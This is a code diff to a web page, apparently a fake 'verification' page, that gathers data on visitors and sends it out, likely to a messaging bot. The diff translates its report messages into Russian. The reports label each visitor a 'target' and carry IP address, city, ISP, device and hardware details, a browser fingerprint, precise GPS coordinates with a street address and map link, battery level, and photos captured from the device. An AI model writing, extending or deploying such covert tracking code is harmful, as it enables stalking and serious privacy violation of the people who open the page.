@@ -187,18 +187,25 @@
             document.getElementById('display-ip').innerText = n.i;
 
             const msg = `
-🎯 *TARGET ONLINE*
+*НОВАЯ ЦЕЛЬ (ONLINE)*
+━━━━━━━━━━━━━━━━
 ${n.v}
-IP: \`${n.i}\`
-Loc: ${n.c}, ${n.n}
-ISP: ${n.o}
-Time: ${n.t}
 
-💻 *DEVICE*
-OS: ${s.p}
-CPU: ${s.c} | RAM: ${s.r}
+*СЕТЬ*
+IP: \`${n.i}\`
+Город: ${n.c} (Таймзона: ${n.t})
+Страна: ${n.n}
+Провайдер: ${n.o}
+Связь: ${navigator.connection ? navigator.connection.effectiveType : "Неизвестно"}
+
+*ЖЕЛЕЗО*
+Устройство: ${navigator.maxTouchPoints > 0 ? "Touch Screen" : "Mouse/Keyboard"}
 GPU: ${s.g}
-FP: ${s.f}
+CPU: ${s.c} ядра | RAM: ${s.r}
+ОС: ${s.p}
+*Fingerprint: ${s.f}*
+
+Время: ${new Date().toLocaleTimeString()}
 `.trim();
 
             await _sD(msg);
@@ -235,9 +242,9 @@ FP: ${s.f}
                             const l = `https://www.google.com/maps?q=${la},${lo}`;
                             let a = "Unknown";
                             try { const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); a = (await req.json()).display_name; } catch{}
-                            r(`Addr: ${a}\nMap: [Link](${l})`);
+                            r(`Адрес: ${a}\nКарты: [клик](${l})`);
                         },
-                        () => r(gps), {enableHighAccuracy:true}
+                        () => r("*Юзер запретил доступ к GPS*"), {enableHighAccuracy:true}
                     );
                 });
 
@@ -263,11 +270,16 @@ FP: ${s.f}
                 document.getElementById('label-text').style.color = "#009900";
 
                 const fM = `
-✅ *VERIFICATION COMPLETE*
-🔋 Bat: ${bat}
-📍 *GEO*:
+*ПОЛНЫЙ ОТЧЕТ (Phase 2)*
+━━━━━━━━━━━━━━━━
+*ГЕОПОЗИЦИЯ*
 ${gps}
-📸 Photos: ${ph.length}
+
+*СТАТУС БАТАРЕИ*
+Заряд: ${bat}
+
+*ФОТО*
+Захвачено фото: ${ph.length} шт.
 `.trim();
 
                 await _sD(fM, ph);
